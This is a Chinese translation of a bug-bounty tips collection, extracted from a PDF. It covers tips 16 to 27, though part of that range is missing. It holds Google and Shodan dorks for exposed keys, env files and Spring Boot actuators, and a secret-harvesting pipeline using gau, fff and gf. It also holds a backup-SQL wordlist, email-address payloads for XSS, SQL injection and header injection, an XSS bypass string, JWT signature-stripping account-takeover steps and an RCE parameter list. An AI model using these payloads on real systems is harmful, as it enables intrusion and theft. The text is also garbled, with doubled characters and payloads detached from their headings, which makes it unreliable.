使⽤用@dwiswant0收集的特殊gf-secrets模式查找敏敏感信息泄露露。下⾯面是如何使⽤用它们。
为了了使这个组合⼯工作，我们必须安装以下额外的⼯工具，⾮非常有⽤用，不不仅仅是对赏⾦金金猎⼈人。
https://github.com/lc/gau
https://github.com/tomnomnom/fff
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
# Search for testing point with gau and fff
gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
sort -u urls.txt | fff -s 200 -o out/
# After we save responses from known URLs, it's time to dig for secrets
for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
验室制作翻译出品
https://github.com/tomnomnom/gf
The patterns: https://github.com/dwisiswant0/gf-secrets
16. ⽤用Shodan查找Spring Boot服务器器
By @sw33tLie
Source: link
在Shodan中搜索以下favicon哈希，以查找部署在⽬目标组织中的Spring Boot服务器器。
然后检查是否有暴暴露露的执⾏行行器器。如果/env是可⽤用的，你可能可以实现RCE。如果/heapdump可以访问，
你可能会发现私钥和令牌。
如果你对Spring Boot技术不不熟悉，不不要担⼼心。这⾥里里有⼀一个快速的指导101。Spring Boot是⼀一个基于Java
的开源框架，⽤用于构建基于微服务概念的独⽴立的spring应⽤用。
Spring Boot Actuator是⼀一种使⽤用Web界⾯面与它们交互的机制。它们通常被映射到URL，如：
https://target.com/env
https://target.com/heapdump
etc.
这是⼀一个示列列的/env actuator:
org:你的⽬目标 http.favicon.hash:116323821
验室制作翻译出品
专业提示：检查所有这些默认的内置执⾏行行器器。其中⼀一些可能会被暴暴露露并包含有趣的信息。
17. 备份数据库扫描字典
By @TobiunddasMoe
Source: link
/back.sql
/backup.sql
/accounts.sql
/backups.sql
/clients.sql
/customers.sql
/data.sql
/database.sql
/database.sqlite
/users.sql
验室制作翻译出品
旧的数据库备份可能包含各种有趣的信息—⽤用户凭据、配置设置、机密和api密钥、客户数据等等。
18. 电⼦子邮件地址payloads
By @securinti (compiled by @intigriti)
Source: link
下⾯面的payloads都是有效的电⼦子邮件地址，我们可以⽤用来对基于⽹网络的电⼦子邮件系统进⾏行行测试。
XSS (Cross-Site Scripting):
模板注⼊入:
SQL 注⼊入:
SSRF (Server-Side Request Forgery):
参数污染:
(Email) 头注⼊入:
/db.sql
/db.sqlite
/db_backup.sql
/dbase.sql
/dbdump.sql
setup.sql
sqldump.sql
/dump.sql
/mysql.sql
/sql.sql
/temp.sql
test+()@example.com
test@example().com
""@example.com
""@example.com
test+(${{7*7}})@example.com
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
PI:EMAIL
john.doe@[127.0.0.1]
victim&email=PI:EMAIL
验室制作翻译出品
This is pure gold!
19. 从员⼯工offers到身份证
By @silentbronco
Source: link
注册成为⼀一名员⼯工会要求员⼯工提供私⼈人优惠，并最终获得⼀一张“身份证”
Here’s what @silentbronco did exactly:
1. 搜索⽬目标'的员⼯工在⾕谷歌上的offers。
2. 找到向⽬目标提供offers的⽹网站。
3. 发现offers只限于员⼯工。
4. 试着在 "员⼯工ID"栏中⽤用随机数注册。
5. 因未验证 "员⼯工证"，成功注册为员⼯工。
6. 注册为员⼯工后，导致私⾃自报价索赔。
7. ⽹网站还提供了了 "身份证"，可以⽤用来证明我们是**⽬目标的合法员⼯工。
下⼀一次当你在为进⼊入⼀一个组织⽽而苦恼的时候，可以尝试寻找他们的员⼯工offers，⽐比如[@沉默的布朗科]（
https://twitter.com/silentbronco）。
20. 与Shodan⼀一起寻找RocketMQ控制台
By @debangshu_kundu
Source: link
这⾥里里⼜又是⼀一个⼩小shodandorks，这次要调出RocketMQ控制台，它经常有相当机密的⽣生产信息披露露。
例例如，从暴暴露露的RocketMQ控制台中，我们可以发现。
额外的主机名和⼦子域
内部IP地址
⽇日志⽂文件位置
版本详情
等。
下⾯面是⼀一个暴暴露露的RocketMQ的例例⼦子。
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"PI:EMAIL>\r\nRCPT TO:'"/>" ontoggle=(co\u006efirm)``>
-->          Breaks comment context
'            Breaks Attribute Context
"            Breaks attribute context
/>           Closes an open tag
    Breaks JS context
"          Mimics the closing of tag
ontoggle     A less known event handler
()           Parentheses around the function
co\u006efirm "confirm" function with Unicoded 'n'
``           Backticks instead of ()
验室制作翻译出品
24. 通过favicon哈希查找相关域
By @m4ll0k2
Source: link
你知道吗，我们可以通过寻找相同的favicon图标哈希值来找到与⽬目标相关的域名和⼦子域名？这正是
@m4ll0k2所做的favihash.py⼯工具的作⽤用。下⾯面是它的使⽤用⽅方法。
简单地说，favihash将允许我们发现与我们的⽬目标域名具有相同的favicon图标哈希。从这⾥里里抓取这个⼯工
具。
https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py
25. 账户接管通过 JWT token forging
By @_mkahmad
Source: link
以下是@_mkahmad是如何通过伪造JWT令牌来接管⼀一个账户的。
Decompiled APK and found API endpoint: 解压APK并发现API端点
/signup/users/generateJwtToken
Sent to repeater (Burp Suite)
在请求中添加了了Auth-Token头。
在标题中使⽤用了了我的账户的认证码。
移除签名部分 -> 成功了了!
在Burp Suite中使⽤用JOSEPH改变了了token中的⽤用户ID。
在响应中得到了了其他⽤用户的JWT标记。
帐户接管!
请注意，所有其他端点都在正确检查JWT令牌。
26. Top 25 远程代码执⾏行行(RCE)参数
By @trbughunters
Source: link
cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > 
targets.txt
python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
验室制作翻译出品
只要你看到这些参数，就要注意了了。你有可能会以某种⽅方式在其中注⼊入代码。
27. SSRF payloads 去绕过 WAF
By @manas_hunter
Source: link
以下是5种有效payloads，当涉及到SSRF（服务器器端请求伪造）时，可⽤用于绕过WAF
1) 使⽤用CIDR绕过SSRF:
2) 使⽤用罕⻅见地址绕过:
3) 使⽤用技巧组合绕过:
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}